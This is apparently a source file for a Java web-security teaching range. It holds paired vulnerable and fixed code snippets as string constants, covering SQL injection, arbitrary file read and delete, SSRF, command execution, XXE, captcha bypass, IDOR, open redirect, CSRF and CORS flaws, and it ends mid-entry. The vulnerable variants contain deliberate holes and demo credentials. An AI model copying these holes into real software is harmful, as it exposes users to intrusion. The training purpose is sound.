    "public R special3In(String type,String scope) {\n" +
    "  switch (type) {\n" +
    "      case \"raw\":\n" +
    "          sqlis = sqliService.inVul(scope);\n" +
    "          break;\n" +
    "      case \"prepareStatement\":\n" +
    "          sqlis = sqliService.inPrepareStatement(scope);\n" +
    "          break;\n" +
    "      case \"Foreach\":\n" +
    "\n" +
    "          sqlis = sqliService.inSafeForeach(parseInputToList(scope));\n" +
    "          break;\n" +
    "  ...\n" +
    "// Service层\n" +
    "@Override\n" +
    "public List<Sqli> inVul(String scope) {\n" +
    "    return sqliMapper.inVul(scope);\n" +
    "}\n" +
    "@Override\n" +
    "public List<Sqli> inPrepareStatement(String scope) {\n" +
    "    return sqliMapper.inPrepareStatement(scope);\n" +
    "}\n" +
    "@Override\n" +
    "public List<Sqli> inSafeForeach(List<Integer> scope) {\n" +
    "    return sqliMapper.inSafeForeach(scope);\n" +
    "}\n" +
    "// Mapper层\n" +
    "<select id=\"inVul\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    select * from sqli where id in (${id})\n" +
    "</select>\n" +
    "\n" +
    "<select id=\"inPrepareStatement\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    select * from sqli where id in (#{id})\n" +
    "</select>\n" +
    "<select id=\"inSafeForeach\" resultType=\"top.whgojp.modules.sqli.entity.Sqli\">\n" +
    "    SELECT * FROM sqli WHERE id IN\n" +
    "    <foreach collection=\"scope\" item=\"id\" open=\"(\" separator=\",\" close=\")\">\n" +
    "        #{id}\n" +
    "    </foreach>\n" +
    "</select>"

const vulHibernate = "vulHibernate"

const safeHibernate = "safeHibernate"

const vulJPA = "vulJPA"
const safeJPA = "safeJPA"


// 任意文件类-文件上传
const anyFileUploadCode = "// 原生漏洞环境，未做任何限制\n" +
    "public R vul(MultipartFile file, HttpServletRequest request) {\n" +
    "    String res;\n" +
    "    String suffix = FilenameUtils.getExtension(\n" +
    "    // 查找文件名中最后一个点（.）之后的字符串\n" +
    "    file.getOriginalFilename()); \n" +
    "    String path = request.getScheme() + \"://\" + request.getServerName() + \":\" + request.getServerPort() + \"/file/\";\n" +
    "    res = uploadUtil.uploadFile(file, suffix, path);\n" +
    "    return R.ok(res);\n" +
    "}\n" +
    "// uploadFile方法详见文件上传导致XSS模块\n"
const anyFileUploadWhiteCode = "// 检测文件后缀，做白名单过滤\n" +
    "if (!checkUserInput.checkFileSuffixWhiteList(suffix)){\n" +
    "    return R.error(\"只能上传图片哦！\");\n" +
    "}\n" +
    "\n" +
    "public boolean checkFileSuffixWhiteList(String suffix) {\n" +
    "    String[] white_list = {\"jpg\", \"png\", \"gif\",\"jpeg\",\"bmp\",\"ico\"};\n" +
    "    for (String s : white_list) {\n" +
    "        if (suffix.toLowerCase().contains(s)) {\n" +
    "            return true;\n" +
    "        }\n" +
    "    }\n" +
    "    return false;\n" +
    "}"

// 任意文件类型-文件删除
const deleteFile = "public String vul(String filePath) {\n" +
    "    String currentPath = System.getProperty(\"user.dir\");\n" +
    "    File file = new File(filePath);\n" +
    "    boolean deleted = false;\n" +
    "    if (file.exists()) {\n" +
    "        deleted = file.delete();\n" +
    "    }\n" +
    "    if (deleted) {\n" +
    "        return \"当前路径:\"+currentPath+\"<br/>文件删除成功: \" + filePath;\n" +
    "    } else {\n" +
    "        return \"当前路径:\"+currentPath+\"<br/>文件删除失败或文件不存在: \" + filePath;\n" +
    "    }\n" +
    "}"
const safeDeleteFile = "public String safe(String fileName) {\n" +
    "    // 限制删除文件所在目录为 /static/upload/下\n" +
    "    String baseDir = sysConstant.getUploadFolder(); \n" +
    "    File file = new File(baseDir, fileName);\n" +
    "    boolean deleted = false;\n" +
    "    if (file.exists() && file.getCanonicalPath().startsWith(new File(baseDir).getCanonicalPath())) {\n" +
    "        deleted = file.delete();\n" +
    "    }\n" +
    "    if (deleted) {\n" +
    "        return \"文件删除成功: \" + fileName;\n" +
    "    } else {\n" +
    "        return \"文件删除失败或文件不存在: \" + fileName;\n" +
    "    }\n" +
    "}"

// 任意文件类型-文件读取
const readFile = "public String vul(String fileName) throws IOException {\n" +
    "    String currentPath = System.getProperty(\"user.dir\");\n" +
    "    log.info(currentPath);\n" +
    "    File file = new File(fileName);\n" +
    "    if (file.exists() && file.isFile()) {\n" +
    "        Path filePath = file.toPath();\n" +
    "        // 使用 BufferedReader 和流 API 逐行读取文件\n" +
    "        try (var lines = Files.lines(filePath)) {\n" +
    "            return lines\n" +
    "                    .map(line -> line + \"<br/>\")\n" +
    "                    .collect(Collectors.joining());\n" +
    "        }\n" +
    "    } else {\n" +
    "        return \"当前路径：\"+currentPath+\"<br/>文件不存在或路径不正确：\" + fileName;\n" +
    "    }"
const safeReadFile = "public String safe(String fileName) throws IOException {\n" +
    "    String baseDir = sysConstant.getUploadFolder(); \n" +
    "    Path filePath = Paths.get(baseDir, fileName).normalize(); \n" +
    "    // 确保文件路径在允许的目录中\n" +
    "    if (!filePath.startsWith(Paths.get(baseDir))) {\n" +
    "        return \"访问被拒绝：文件路径不合法\";\n" +
    "    }\n" +
    "    File file = filePath.toFile();\n" +
    "    if (file.exists() && file.isFile()) {\n" +
    "        return new String(Files.readAllBytes(file.toPath()));\n" +
    "    } else {\n" +
    "        return \"文件不存在或路径不正确：\" + fileName;\n" +
    "    }\n" +
    "}"

// 任意文件类型-文件下载
const downloadFile = 'public void vul(String fileName, HttpServletResponse response) throws IOException {\n' +
    '    File file = new File(fileName);\n' +
    '\n' +
    '    if (file.exists() && file.isFile()) {\n' +
    '        response.setContentType("application/octet-stream");\n' +
    '        response.setHeader("Content-Disposition", "attachment; filename=\\"" + file.getName() + "\\"");\n' +
    '        try (FileInputStream fis = new FileInputStream(file);\n' +
    '             OutputStream os = response.getOutputStream()) {\n' +
    '            StreamUtils.copy(fis, os);\n' +
    '            os.flush();\n' +
    '            ...\n' +
    '    } else {\n' +
    '        response.sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在：" + fileName);\n' +
    '    }\n' +
    '}'
const safeDownloadFile = 'public void safe(String fileName,HttpServletResponse response) throws IOException {\n' +
    '    String baseDir = sysConstant.getUploadFolder();\n' +
    '    if (!isValidFileName(fileName)) {\n' +
    '        response.sendError(HttpServletResponse.SC_BAD_REQUEST, "非法文件名：" + fileName);\n' +
    '        return;\n' +
    '        }\n' +
    '    File file = new File(baseDir, fileName);\n' +
    '\n' +
    '    if (file.exists() && file.isFile()) {\n' +
    '        response.setContentType("application/octet-stream");\n' +
    '        response.setHeader("Content-Disposition", "attachment; filename=\\"" + file.getName() + "\\"");\n' +
    '        try (FileInputStream fis = new FileInputStream(file);\n' +
    '             OutputStream os = response.getOutputStream()) {\n' +
    '            StreamUtils.copy(fis, os);\n' +
    '            os.flush();\n' +
    '            ...\n' +
    '    } else {\n' +
    '        response.sendError(HttpServletResponse.SC_NOT_FOUND, "文件不存在：" + fileName);\n' +
    '    }\n' +
    '}'

// ssrf-服务端请求伪造
const vul1URLConnection = "public String vul(String url) {\n" +
    "    try {\n" +
    "        URL u = new URL(url);\n" +
    "        // 这里以URLConnection作为演示\n" +
    "        URLConnection conn = u.openConnection();\n" +
    "        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n" +
    "        String content;\n" +
    "        StringBuilder html = new StringBuilder();\n" +
    "        html.append(\"<pre>\");\n" +
    "        while ((content = reader.readLine()) != null) {\n" +
    "            html.append(content).append(\"\\n\");\n" +
    "        }\n" +
    "        html.append(\"</pre>\");\n" +
    "        reader.close();\n" +
    "        return html.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.getMessage();\n" +
    "    }\n" +
    "}"
const safe1WhiteList = "public String safe(String url) {\n" +
    "    if (!checkUserInput.isHttp(url)) {\n" +
    "        return \"检测到不是http(s)协议！\";\n" +
    "    } else if (!checkUserInput.ssrfWhiteList(url)) {\n" +
    "        return \"非白名单域名！\";\n" +
    "    } else {\n" +
    "        ...\n" +
    "    }\n" +
    "}\n" +
    "// ssrf：判断http(s)协议\n" +
    "public boolean isHttp(String url){\n" +
    "    return url.startsWith(\"http://\") || url.startsWith(\"https://\");\n" +
    "}\n" +
    "// ssrf：请求域名白名单\n" +
    "public boolean ssrfWhiteList(String url) {\n" +
    "    List<String> urlList = new ArrayList<>(Arrays.asList(\"baidu.com\", \"www.baidu.com\", \"whgojp.top\"));\n" +
    "    try {\n" +
    "        URI uri = new URI(url.toLowerCase());\n" +
    "        String host = uri.getHost();\n" +
    "        return urlList.contains(host);\n" +
    "    } catch (URISyntaxException e) {\n" +
    "        System.out.println(e);\n" +
    "        return false;\n" +
    "    }\n" +
    "}"

// RCE
const vulProcessBuilder = "public R vul1(String payload) throws IOException {\n" +
    "    String[] command = {\"sh\", \"-c\",payload};\n" +
    "\n" +
    "    ProcessBuilder pb = new ProcessBuilder(command);\n" +
    "    pb.redirectErrorStream(true);\n" +
    "    Process process = pb.start();\n" +
    "    InputStream inputStream = process.getInputStream();\n" +
    "    BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n" +
    "    String line;\n" +
    "    StringBuilder output = new StringBuilder();\n" +
    "    while ((line = reader.readLine()) != null) {\n" +
    "        output.append(line).append(\"\\n\");\n" +
    "    }\n" +
    "    return R.ok(output.toString());\n" +
    "}"

const vulGetRuntime = "public R vul2(String payload) throws IOException {\n" +
    "    StringBuilder sb = new StringBuilder();\n" +
    "    String line;\n" +
    "    Process proc = Runtime.getRuntime().exec(payload);\n" +
    "    InputStream inputStream = proc.getInputStream();\n" +
    "    InputStreamReader isr = new InputStreamReader(inputStream);\n" +
    "    BufferedReader br = new BufferedReader(isr);\n" +
    "    while ((line = br.readLine()) != null) {\n" +
    "        sb.append(line);\n" +
    "    }\n" +
    "    return R.ok(sb.toString());\n" +
    "}"
const vulProcessImpl = "public R vul3(String payload) throws Exception {\n" +
    "    // 获取 ProcessImpl 类对象\n" +
    "    Class<?> clazz = Class.forName(\"java.lang.ProcessImpl\");\n" +
    "\n" +
    "    // 获取 start 方法\n" +
    "    Method method = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);\n" +
    "    method.setAccessible(true);\n" +
    "\n" +
    "    Process process = (Process) method.invoke(null, new String[]{payload}, null, null, null, false);\n" +
    "    try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n" +
    "        StringBuilder output = new StringBuilder();\n" +
    "        String line;\n" +
    "        while ((line = reader.readLine()) != null) {\n" +
    "            output.append(line).append(\"\\n\");\n" +
    "        }\n" +
    "        return R.ok(output.toString());\n" +
    "    }\n" +
    "}"
const safeProcessBuilder = "// 验证命令是否在允许的列表中\n" +
    "if (!ALLOWED_COMMANDS.contains(payload)) {\n" +
    "    return R.error(\"不允许执行该命令！\");\n" +
    "}\n" +
    "\n" +
    "// 可执行命令白名单\n" +
    "private static final List<String> ALLOWED_COMMANDS = Arrays.asList(\"ls\", \"date\");"

const vulGroovy = "public R vulGroovy(String payload) {\n" +
    "    try {\n" +
    "        GroovyShell shell = new GroovyShell();\n" +
    "        Object result = shell.evaluate(payload); \n" +
    "        if (result instanceof Process) {\n" +
    "            Process process = (Process) result;\n" +
    "            String output = getProcessOutput(process);\n" +
    "            return R.ok(\"[+] Groovy代码执行，结果：\" + output);\n" +
    "        } else {\n" +
    "            return R.ok(\"[+] Groovy代码执行，结果：\" + result.toString());\n" +
    "        }\n" +
    "    } catch (Exception e) {\n" +
    "        return R.error(e.getMessage());\n" +
    "    }\n" +
    "}\n" +
    "private String getProcessOutput(Process process) {\n" +
    "    StringBuilder output = new StringBuilder();\n" +
    "    try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {\n" +
    "        String line;\n" +
    "        while ((line = reader.readLine()) != null) {\n" +
    "            output.append(line).append(\"\\n\");\n" +
    "        }\n" +
    "    } catch (Exception e) {\n" +
    "        return \"读取输出失败: \" + e.getMessage();\n" +
    "    }\n" +
    "    return output.toString();\n" +
    "}"
const safeGroovy = 'public R safeGroovy(String payload) {\n' +
    '    List<String> trustedScripts = Arrays.asList(\n' +
    '            "\\"id\\".execute()",\n' +
    '            "\\"ls\\".execute()",\n' +
    '            "\\"whoami\\".execute()"\n' +
    '    );\n' +
    '    if (!isTrustedScript(payload, trustedScripts)) {\n' +
    '        return R.error("非法的脚本输入！");\n' +
    '    }\n' +
    '    try {\n' +
    '        GroovyShell shell = new GroovyShell();\n' +
    '        Object result = shell.evaluate(payload);  \n' +
    '        if (result instanceof Process) {\n' +
    '            Process process = (Process) result;\n' +
    '            String output = getProcessOutput(process);\n' +
    '            return R.ok("[+] 执行受信任的脚本，结果：" + output);\n' +
    '        } else {\n' +
    '            return R.ok("[+] 执行受信任的脚本，结果：" + result.toString());\n' +
    '        }\n' +
    '    } catch (Exception e) {\n' +
    '        return R.error(e.getMessage());\n' +
    '    }\n' +
    '}\n' +
    'private boolean isTrustedScript(String script, List<String> trustedScripts) {\n' +
    '    return trustedScripts.contains(script);\n' +
    '}'

// XXE

const vulXMLReader = "public String vul1(String payload) {\n" +
    "    try {\n" +
    "        XMLReader xmlReader = XMLReaderFactory.createXMLReader();\n" +
    "        StringWriter stringWriter = new StringWriter();\n" +
    "        xmlReader.setContentHandler(new DefaultHandler() {\n" +
    "            public void characters(char[] ch, int start, int length) {\n" +
    "                for (int i = start; i < start + length; i++) {\n" +
    "                    if (ch[i] == '\\n') {\n" +
    "                        stringWriter.write(\"<br/>\");\n" +
    "                    } else {\n" +
    "                        stringWriter.write(ch[i]);\n" +
    "                    }\n" +
    "                }\n" +
    "            }\n" +
    "        });\n" +
    "        xmlReader.parse(new InputSource(new StringReader(payload)));\n" +
    "        return stringWriter.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.getMessage();\n" +
    "    }\n" +
    "}"

const vulSAXParser = "public String vul2(String payload) {\n" +
    "    try {\n" +
    "        SAXParserFactory factory = SAXParserFactory.newInstance();\n" +
    "        SAXParser parser = factory.newSAXParser();\n" +
    "        ...\n" +
    "        parser.parse(new InputSource(new StringReader(payload)), handler);\n" +
    "        return stringWriter.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.toString();\n" +
    "    }\n" +
    "}"

const safeXMLReader = "public String safe1(String payload) {\n" +
    "    try {\n" +
    "        XMLReader xmlReader = XMLReaderFactory.createXMLReader();\n" +
    "        // 禁用外部实体引用，防止XXE攻击\n" +
    "        xmlReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n" +
    "        xmlReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n" +
    "        xmlReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n" +
    "         ...\n" +
    "        xmlReader.parse(new InputSource(new StringReader(payload)));\n" +
    "        return stringWriter.toString();\n" +
    "    } catch (Exception e) {\n" +
    "        return e.getMessage();\n" +
    "    }\n" +
    "}"
const safeBlackList = "public String safe2(String payload) {\n" +
    "    String[] black_list = {\"ENTITY\", \"DOCTYPE\"};\n" +
    "    for (String keyword : black_list) {\n" +
    "        if (payload.toUpperCase().contains(keyword)) {\n" +
    "            return \"[+]检测到恶意XML！\";\n" +
    "        }\n" +
    "    }\n" +
    "    return \"[-]XML内容安全\";\n" +
    "}"

// 漏洞漏洞

// 验证码安全
const vul1Graphic = "public Boolean verifyCaptcha(String captchaInput, HttpSession session) {\n" +
    "    String sessionCaptcha = (String) session.getAttribute(\"vulCaptcha\");\n" +
    "    Long captchaCreationTime = (Long) session.getAttribute(\"captchaCreationTime\");\n" +
    "    // 如果没有验证码或生成时间，返回失败\n" +
    "    if (sessionCaptcha == null || captchaCreationTime == null) {\n" +
    "        return false;\n" +
    "    }\n" +
    "    // 验证码有效期为300秒（5分钟）5分钟可以无限制爆破账号密码\n" +
    "    long captchaExpiryTime = 300 * 1000; // 300秒转换为毫秒\n" +
    "    // 检查验证码是否过期\n" +
    "    if (System.currentTimeMillis() - captchaCreationTime > captchaExpiryTime) {\n" +
    "        session.removeAttribute(\"vulCaptcha\");\n" +
    "        session.removeAttribute(\"captchaCreationTime\");\n" +
    "        return false;\n" +
    "    }\n" +
    "    // 验证输入的验证码 这里验证失败后也没有清除旧的验证码\n" +
    "    if (sessionCaptcha.equalsIgnoreCase(captchaInput)) {\n" +
    "        return true;\n" +
    "    } else {\n" +
    "        return false;\n" +
    "    }\n" +
    "}"
const vul2Graphic = "public R vul2(String username, String password, String captcha,HttpSession session) {\n" +
    "\tString sessionCaptcha = (String) session.getAttribute(\"vulCaptcha\");\n" +
    "\t// 万能验证码：6666\n" +
    "\tif (\"6666\".equals(captcha) || (sessionCaptcha != null && sessionCaptcha.equalsIgnoreCase(captcha))) {\n" +
    "\t\t// 及时清除旧验证码\n" +
    "\t\tsession.removeAttribute(\"vulCaptcha\");\n" +
    "\t\tif (REAL_USERNAME.equals(username) && REAL_PASSWORD.equals(password)) {\n" +
    "\t\t\treturn R.ok(\"账号爆破成功！用户名：\" + username + \",密码：\" + password);\n" +
    "\t\t}else return R.error(\"账号或密码错误!\");\n" +
    "\t}else {\n" +
    "\t\tsession.removeAttribute(\"vulCaptcha\");\n" +
    "\t\treturn R.error(\"验证码错误！\");\n" +
    "\t}\n" +
    "}"
const vul3Graphic = "public R vul3(String username, String password, String captcha, HttpSession session) {\n" +
    "\tString sessionCaptcha = (String) session.getAttribute(\"vulCaptcha\");\n" +
    "\tif (sessionCaptcha != null && sessionCaptcha.equalsIgnoreCase(captcha)) {\n" +
    "\t\tsession.removeAttribute(\"vulCaptcha\");\n" +
    "\t\tif (REAL_USERNAME.equals(username) && REAL_PASSWORD.equals(password)) {\n" +
    "\t\t\treturn R.ok(\"账号爆破成功！用户名：\" + username + \",密码：\" + password);\n" +
    "\t\t} else return R.error(\"账号或密码错误!\");\n" +
    "\t} else {\n" +
    "\t\tsession.removeAttribute(\"vulCaptcha\");\n" +
    "\t\treturn R.error(\"验证码错误！\");\n" +
    "\t}\n" +
    "}"
const safeGraphic = "public R safe(String username, String password, String captcha, HttpSession session) {\n" +
    "    String sessionCaptcha = (String) session.getAttribute(\"safeCaptcha\");\n" +
    "    Long captchaTimestamp = (Long) session.getAttribute(\"captchaTimestamp\");\n" +
    "    // 验证验证码是否已失效（1分钟有效）\n" +
    "    if (captchaTimestamp == null || System.currentTimeMillis() - captchaTimestamp > 60 * 1000) {\n" +
    "        session.removeAttribute(\"safeCaptcha\");\n" +
    "        session.removeAttribute(\"captchaTimestamp\");\n" +
    "        return R.error(\"验证码已失效，请重新获取！\");\n" +
    "    }\n" +
    "    if (sessionCaptcha != null && sessionCaptcha.equalsIgnoreCase(captcha)) {\n" +
    "        session.removeAttribute(\"safeCaptcha\");\n" +
    "        session.removeAttribute(\"captchaTimestamp\");\n" +
    "        if (REAL_USERNAME.equals(username) && REAL_PASSWORD.equals(password)) {\n" +
    "            return R.ok(\"登录成功！用户名：\" + username + \",密码：\" + password);\n" +
    "        } else {\n" +
    "            return R.error(\"账号或密码错误!\");\n" +
    "        }\n" +
    "    } else {\n" +
    "        session.removeAttribute(\"safeCaptcha\");\n" +
    "        session.removeAttribute(\"captchaTimestamp\");\n" +
    "        return R.error(\"验证码错误，请重新输入！\");\n" +
    "    }\n" +
    "}\n" +
    "\n" +
    "// 设置图形验证码长度6位\n" +
    "ShearCaptcha shearCaptcha = CaptchaUtil.createShearCaptcha(90, 30, 6, 3);"

const vul1SMS = "public R code(String phone, HttpSession session) {\n" +
    "    ...\n" +
    "    Random random = new Random();\n" +
    "    // 随机生成6位数验证码\n" +
    "    String captcha = String.valueOf(100000 + random.nextInt(900000));\n" +
    "    session.setAttribute(\"phone\", phone);\n" +
    "    session.setAttribute(\"smsCode\", captcha);\n" +
    "    session.setAttribute(\"captchaTimestamp\", System.currentTimeMillis());\n" +
    "    // 错误的将短信验证码回显在响应包中\n" +
    "    return R.ok(\"发送验证码成功！\" + captcha);\n" +
    "}"
const vul2SMS = "public R vul2(String phone, String code, @RequestParam(required = false, defaultValue = \"false\") boolean code_verify, HttpSession session) {\n" +
    "    ...\n" +
    "    // 校验code_verify字段，如果为true则验证登录成功\n" +
    "    if (code_verify){\n" +
    "        return R.ok(\"验证通过！用户：\"+phone);\n" +
    "    }\n" +
    "    if (!sessionCaptcha.equals(code)) {\n" +
    "        return R.error(\"验证码错误，请重新输入！\");\n" +
    "    }\n" +
    "    ...\n" +
    "    return R.ok(\"验证通过！用户：\"+phone);\n" +
    "}"


// 越权漏洞
const vulHorizon = "public String vul() {\n" +
    "\tString currentUsername = SecurityContextHolder.getContext().getAuthentication().getName();\n" +
    "\tif (\"admin\".equals(currentUsername)) {\n" +
    "\t\treturn \"/vul/logic/idor/admin\";\n" +
    "\t} else return \"common/401\";\n" +
    "}"
const safeHorizon = "public R safe(String username){\n" +
    "    // 获取当前登录的用户名\n" +
    "    String currentUsername = SecurityContextHolder.getContext().getAuthentication().getName();\n" +
    "    // 检查当前请求的用户名是否和登录用户名一致\n" +
    "    if (!username.equals(currentUsername)) {\n" +
    "        return R.error(\"您没有权限查看该用户的资料,当前登录用户：\"+currentUsername);\n" +
    "    }\n" +
    "    // 查询用户信息\n" +
    "    User user = userMapper.getAllByUsername(username);\n" +
    "    if (user != null) {\n" +
    "        return R.ok(\"用户名：\"+user.getUsername()+\" 密码：\"+user.getPassword());\n" +
    "    } else {\n" +
    "        return R.error(\"用户名不存在\");\n" +
    "    }\n" +
    "}"

// 支付漏洞


// 其他漏洞
const vul1SpringMvcRedirect = "// 基于Spring MVC的重定向方式\n" +
    "// 通过返回带有 redirect: 前缀的字符串来实现重定向。\n" +
    "public String vul1(@RequestParam(\"url\") String url) {\n" +
    "    return \"redirect:\" + url;   // Spring MVC写法 302临时重定向\n" +
    "}\n" +
    "\n" +
    "// 通过返回 ModelAndView 对象并指定 redirect: 前缀来实现重定向。\n" +
    "public ModelAndView vul2(@RequestParam(\"url\") String url) {\n" +
    "    return new ModelAndView(\"redirect:\" + url); // Spring MVC写法 使用ModelAndView 302临时重定向\n" +
    "}";

const vul2ServletRedirect = "// 基于Servlet标准的重定向方式\n" +
    "// 通过设置响应状态码和头部信息实现重定向。\n" +
    "public static void vul2(HttpServletRequest request, HttpServletResponse response) {\n" +
    "    String url = request.getParameter(\"url\");\n" +
    "    response.setStatus(HttpServletResponse.SC_MOVED_PERMANENTLY); // 301永久重定向\n" +
    "    response.setHeader(\"Location\", url);\n" +
    "}\n" +
    "\n" +
    "// 通过调用 HttpServletResponse.sendRedirect() 实现重定向。\n" +
    "public static void vul3(HttpServletRequest request, HttpServletResponse response) throws IOException {\n" +
    "    String url = request.getParameter(\"url\");\n" +
    "    response.sendRedirect(url); // 302临时重定向\n" +
    "}";

const vul3SpringRedirect = "// 基于Spring注解和状态码的重定向方式\n" +
    "// 使用ResponseEntity设置状态码实现重定向\n" +
    "public ResponseEntity<Void> vul5(@RequestParam(\"url\") String url) {\n" +
    "    HttpHeaders headers = new HttpHeaders();\n" +
    "    headers.setLocation(URI.create(url));\n" +
    "    return new ResponseEntity<>(headers, HttpStatus.FOUND); // 302临时重定向\n" +
    "}\n" +
    "\n" +
    "// 通过注解设置状态码实现重定向\n" +
    "@ResponseStatus(HttpStatus.FOUND) // 302临时重定向\n" +
    "public void vul6(HttpServletRequest request, HttpServletResponse response) throws IOException {\n" +
    "    String url = request.getParameter(\"url\");\n" +
    "    response.setHeader(\"Location\", url);\n" +
    "}";
const safe1Forward = "// 内部跳转\n" +
    "public static void safe1(HttpServletRequest request, HttpServletResponse response) {\n" +
    "    String url = request.getParameter(\"url\");\n" +
    "    RequestDispatcher rd = request.getRequestDispatcher(url);\n" +
    "    try {\n" +
    "        // 做了内部转发\n" +
    "        rd.forward(request, response);\n" +
    "    } catch (Exception e) {\n" +
    "        e.printStackTrace();\n" +
    "    }\n" +
    "}";
const safe2CheckUrl = '// 定义 URL 白名单\n' +
    'private static final List<String> WhiteUrlList = new ArrayList<>();\n' +
    '\n' +
    'static {\n' +
    '//        WhiteUrlList.add("baidu.com");\n' +
    '//        WhiteUrlList.add("bilibili.com");\n' +
    '    WhiteUrlList.add("csdn.net");\n' +
    '}\n' +
    '/**\n' +
    ' * URL跳转过滤\n' +
    ' */\n' +
    'public boolean checkURL(String url) {\n' +
    '    for (String blackUrl : WhiteUrlList) {\n' +
    '        if (url.toLowerCase().contains(blackUrl.toLowerCase())) {\n' +
    '            return false;\n' +
    '        }\n' +
    '    }\n' +
    '    return true;\n' +
    '}\n';
const vulXffforgery = "public String vul1(HttpServletRequest request, Model model) {\n" +
    "    // 前后端不分离 使用request.getRemoteHost()获取客户端IP\n" +
    "    final String remoteHost = request.getRemoteHost();\n" +
    "    boolean isClientIP8888 = \"8.8.8.8\".equals(remoteHost);\n" +
    "    model.addAttribute(\"clientIP\", remoteHost);\n" +
    "    // 添加敏感信息\n" +
    "    if (isClientIP8888) {\n" +
    "        model.addAttribute(\"sensitiveInfo\", \"username:admin,password:Admin123\");\n" +
    "    }\n" +
    "    return \"vul/other/onlyForGoogle\";\n" +
    "}\n" +
    "\n" +
    "public String vul2(HttpServletRequest request, HttpServletResponse response, Model model, String xff) {\n" +
    "    // 前后端分离 模拟通过X-Forwarded-For头获取客户端IP\n" +
    "    String remoteHost = \"\";\n" +
    "    if (xff.equals(\"true\")) {\n" +
    "        remoteHost = request.getHeader(\"X-Forwarded-For\");\n" +
    "    }\n" +
    "    if (remoteHost.isEmpty()) {\n" +
    "        remoteHost = request.getRemoteHost();\n" +
    "    }\n" +
    "    boolean isClientIP8888 = \"8.8.8.8\".equals(remoteHost);\n" +
    "    // 添加敏感信息\n" +
    "    model.addAttribute(\"clientIP\", remoteHost);\n" +
    "    if (isClientIP8888) {\n" +
    "        model.addAttribute(\"sensitiveInfo\", \"username:admin,password:Admin123\");\n" +
    "    }\n" +
    "    return \"vul/other/onlyForGoogle\";\n" +
    "}";

const safeXffforgery = "public String safe(HttpServletRequest request, HttpServletResponse response, Model model, String xff){\n" +
    "    ...\n" +
    "    if (!isTrustedProxy(remoteHost)){\n" +
    "        model.addAttribute(\"clientIP\", request.getRemoteAddr());\n" +
    "        model.addAttribute(\"sensitiveInfo\", \"源ip不在白名单范围内！\");\n" +
    "        return \"vul/other/onlyForGoogle\";\n" +
    "    }\n" +
    "    ...\n" +
    "}\n" +
    "// 判断是否来自可信代理\n" +
    "private boolean isTrustedProxy(String ip) {\n" +
    "    return Arrays.asList(\"127.0.0.1\", \"192.168.1.1\", \"10.0.0.1\").contains(ip);\n" +
    "}"

const vulCsrf = "public R vul(String receiver, String amount, @AuthenticationPrincipal UserDetails userDetails){\n" +
    "    String currentUser = userDetails.getUsername();\n" +
    "    Map<String, Object> result = new HashMap<>();\n" +
    "    result.put(\"currentUser\", currentUser);\n" +
    "    result.put(\"receiver\", receiver);\n" +
    "    result.put(\"amount\", amount);\n" +
    "    return R.ok(result);\n" +
    "}"
const safeCsrfToken = "public Map<String, Object> safeCsrf(String receiver,String amount,@AuthenticationPrincipal UserDetails userDetails,String csrfToken,HttpSession session) {\n" +
    "    String currentUser = userDetails.getUsername();\n" +
    "\n" +
    "    String sessionToken = (String) session.getAttribute(\"csrfToken\");\n" +
    "    Map<String, Object> result = new HashMap<>();\n" +
    "    if (!csrfToken.equals(sessionToken)) {\n" +
    "        result.put(\"success\", false);\n" +
    "        result.put(\"message\", \"Token失效！\");\n" +
    "        return result;\n" +
    "    }\n" +
    "    result.put(\"currentUser\", currentUser);\n" +
    "    result.put(\"receiver\", receiver);\n" +
    "    result.put(\"amount\", amount);\n" +
    "    result.put(\"csrfToken\", csrfToken);\n" +
    "    return result;\n" +
    "}"
const safeCsrfReferer = "public Map<String, Object> safe2(HttpServletRequest request,String receiver,String amount, @AuthenticationPrincipal UserDetails userDetails, HttpSession session) {\n" +
    "    String currentUser = userDetails.getUsername();\n" +
    "    Map<String, Object> result = new HashMap<>();\n" +
    "    String referer = request.getHeader(\"referer\");\n" +
    "    if (referer == null || !referer.startsWith(\"http://127.0.0.1\")) {\n" +
    "        result.put(\"success\", false);\n" +
    "        result.put(\"message\", \"referer无效！\");\n" +
    "        return result;\n" +
    "    }\n" +
    "    result.put(\"currentUser\", currentUser);\n" +
    "    result.put(\"receiver\", receiver);\n" +
    "    result.put(\"amount\", amount);\n" +
    "    return result;\n" +
    "}"

// 跨域安全问题
const vulCORS = "public String vul(HttpServletRequest request, HttpServletResponse response) {\n" +
    "    String origin = request.getHeader(\"origin\");\n" +
    "\n" +
    "    if (origin != null) {\n" +
    "        response.setHeader(\"Access-Control-Allow-Origin\", origin);\n" +
    "    } else {\n" +
    "        response.setHeader(\"Access-Control-Allow-Origin\", \"http://example.com\");\n" +
    "    }\n" +
    "\n" +
    "    // 允许携带 Cookie 或其他凭证\n" +
    "    response.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n" +
    "    response.setHeader(\"Access-Control-Allow-Methods\", \"GET, POST, PUT, DELETE, OPTIONS\");\n" +
    "\n" +
    "    return \"CORS漏洞演示：username:admin,password:Admin123\";\n" +
    "}"

const safeCORS = "@CrossOrigin(origins = {\"http://127.0.0.1:8080\", \"https://127.0.0.1:8080\"}, allowCredentials = \"true\")\n" +
    "public String safe(HttpServletRequest request, HttpServletResponse response) {\n" +
    "    // 记录安全 CORS 请求来源\n" +
    "    String origin = request.getHeader(\"origin\");\n" +
    "    // 允许携带凭证，但前提是 `Access-Control-Allow-Origin` 与可信来源匹配\n" +
    "    response.setHeader(\"Access-Control-Allow-Credentials\", \"true\");\n" +
    "\n" +
    "    return \"配置CORS可信源白名单\";\n" +
    "}\n"

const vulJSONP = 'public void vul(HttpServletRequest request, HttpServletResponse response) throws IOException, java.io.IOException {\n' +
